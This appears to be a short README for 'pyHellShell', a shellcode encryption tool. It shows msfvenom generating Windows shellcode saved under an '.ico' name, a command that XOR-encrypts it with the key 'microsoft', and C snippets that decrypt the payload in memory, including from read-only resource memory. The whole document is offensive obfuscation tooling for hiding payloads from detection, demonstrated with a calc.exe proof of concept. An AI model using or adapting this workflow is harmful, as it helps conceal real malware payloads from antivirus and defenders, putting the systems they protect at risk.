pyHellShell
```bash
└─# msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o calc.ico
└─# python3 pyHellShell.py -i ~/homelab/calc.ico -e xor -k microsoft -f raw -out ~/homelab/calc_enc.ico
```

Decryption 
```c
void XOR(unsigned char* data, size_t data_len, unsigned char* key, size_t key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        data[i] ^= key[j];
        j++;
        if (j == key_len) j = 0;
    }
}
```

main usage 
```c
// buf == payload, sPayloadSize == size of payload 
unsigned char key[] = "microsoft";
SIZE_T sKeySize = strlen((char*)key);
XOR(buf, sPayloadSize, key, sKeySize);
```

main usage2 - from read-only memory like rsrc or something 
```c
// Copy the payload into writable memory
unsigned char* writablePayload = (unsigned char*)malloc(sPayloadSize + 1);  // +1 for null terminator
if (writablePayload == NULL) {
    perror("malloc failed");
    return -1;
}
memcpy(writablePayload, pPayloadAddress, sPayloadSize);
writablePayload[sPayloadSize] = '\0';  // Null terminate the copied data

unsigned char key[] = "microsoft";
SIZE_T sKeySize = strlen((char*)key);
XOR(writablePayload, sPayloadSize, key, sKeySize);
```